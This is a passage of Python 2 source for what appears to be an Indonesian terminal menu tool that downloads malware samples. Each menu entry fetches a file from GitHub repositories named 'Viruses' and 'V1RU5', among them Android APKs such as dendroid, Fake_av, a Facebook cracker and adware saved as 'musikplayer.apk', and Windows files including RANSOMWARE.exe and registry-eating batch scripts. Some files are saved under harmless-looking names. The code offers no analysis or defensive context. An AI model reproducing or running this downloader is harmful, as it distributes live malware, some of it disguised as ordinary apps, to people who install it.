        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('24',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/com.funnyys.apk', 'comfunny.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('25',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/com.imagepets.apk', 'comimage.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('26',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/com.kitchenn.apk', 'comkichen.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('27',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/com.laughtter.apk', 'comlaughtr.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('28',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/com.prasesamor.apk', 'prasesamor.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('29',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/com.prasesfee.apk', 'prasesfee.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('30',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/com.recipesmart.apk', 'recipsmart.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('31',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/com.romaticpos.apk', 'romaticpos.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('32',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/com.statetss.apk', 'statets.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('33',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/com.thinkking.apk', 'thinking.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('34',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/crd.apk', 'crd.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('35',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/dendroid.apk', 'dendroid.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('36',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/ds.apk', 'ds.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('37',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/facebook.apk', 'facebook.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('38',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/Fake_av.apk', 'fakeav.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('39',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/ArtStation.apk', 'artstation.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('40',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/Adware.apk', 'musikplayer.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('41',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/Settings.apk', 'setting.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('42',):
        urllib.urlretrieve('https://github.com/Gameye98/V1RU5/raw/master/fbcr.apk', 'fbcracker.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('43',):
        urllib.urlretrieve('https://github.com/Gameye98/V1RU5/raw/master/Mobile_Legends_Adventure.apk', 'gameml.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('44',):
        urllib.urlretrieve('https://github.com/Gameye98/V1RU5/raw/master/TakeBeer.apk', 'takebear.apk')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
        elif again == 'Y' or again == 'y':
            android()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            android()
    elif mana in ('B', 'b'):
        menu()
    elif mana in ('E', 'e'):
        keluar()
    else:
        print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
        time.sleep(1)
        pilih_android()


def windows():
    os.system('clear')
    print logo
    print '  %s(%s01%s)%s UGLY.bat      %s(%s07%s)%s CAPSLOCK.vbs' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s02%s)%s SLEEPY.bat    %s(%s08%s)%s ALAY.vbs' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s03%s)%s REGEATER.bat  %s(%s09%s)%s RANSOMWARE.exe' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s04%s)%s KUIS.bat      %s(%s10%s)%s RIP.bat' % (putih, cyan, putih, hijau, putih, cyan, putih, hijau)
    print '  %s(%s05%s)%s KOCE.bat' % (putih, cyan, putih, hijau)
    print '  %s(%s06%s)%s CMD.bat' % (putih, cyan, putih, hijau)
    print batas
    print men
    print batas
    pilih_windows()


def pilih_windows():
    mana = raw_input('\x1b[37m(\x1b[36m!\x1b[37m)\x1b[32m input@rzky\x1b[31m =>\x1b[33;1m ')
    if mana == '':
        print '%s(%s!%s)%s Invalid Menu' % (putih, merah, putih, merah)
        pilih_windows()
    elif mana in ('1', '01'):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/ugly.bat', 'ugly.bat')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            windows()
        elif again == 'Y' or again == 'y':
            windows()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            windows()
    elif mana in ('2', '02'):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/sleepy.bat', 'sleepy.bat')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            windows()
        elif again == 'Y' or again == 'y':
            windows()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            windows()
    elif mana in ('3', '03'):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/reg-eater.bat', 'regeater.bat')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            windows()
        elif again == 'Y' or again == 'y':
            windows()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            windows()
    elif mana in ('4', '04'):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/kuis.bat', 'kuis.bat')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            windows()
        elif again == 'Y' or again == 'y':
            windows()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            windows()
    elif mana in ('5', '05'):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/koce.bat', 'koce.bat')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
